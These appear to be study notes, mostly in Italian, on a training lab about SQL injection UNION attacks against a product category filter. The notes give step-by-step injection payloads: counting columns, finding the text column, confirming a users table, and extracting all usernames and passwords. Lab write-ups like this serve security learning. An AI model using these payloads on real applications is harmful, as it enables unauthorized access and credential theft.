This lab contains an SQL injection vulnerability in the product category filter.
The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.


IPOTESI QUERY

SELECT a FROM Table1;

(collegamento a lab precedenti)


DETERMINARE IL NUMERO DI COLONNE.

1) SELECT a FROM Table1;
' ORDER BY 2--
= SELECT a FROM Table1' ORDER BY 2--;

2) SELECT a FROM Table1;
' UNION SELECT NULL,NULL--
= SELECT a FROM Table1' UNION SELECT NULL,NULL--;


DETERMINARE QUALI COLONNE POSSONO CONTENERE DEL TESTO.

3) SELECT a FROM Table1;
' UNION SELECT NULL,NULL--
= SELECT a FROM Table1' UNION SELECT NULL,'a'--;

(PROBABILMENTE LA PRIMA COLONNA E' USATA PER GESTIRE GLI ID E NON ACCETTA TESTO, OLTRE A NON ESSERE VISIBILE)


CONFERMARE ESISTENZA TABELLA users.

4) SELECT a FROM Table1;
' UNION SELECT NULL,NULL FROM users--
= SELECT a FROM Table1' UNION SELECT NULL,NULL FROM users--;

ESTRARRE username E password DA TABELLA users CONCATENANDO I RISULTATI NELLA SECONDA COLONNA (LA SOLA CHE IN QUESTO LAB SUPPORTA DEL TESTO)

5) SELECT a FROM Table1;
' UNION SELECT NULL,username || '-' || password FROM users--
= SELECT a FROM Table1' UNION SELECT NULL,username || '-' || password FROM users--;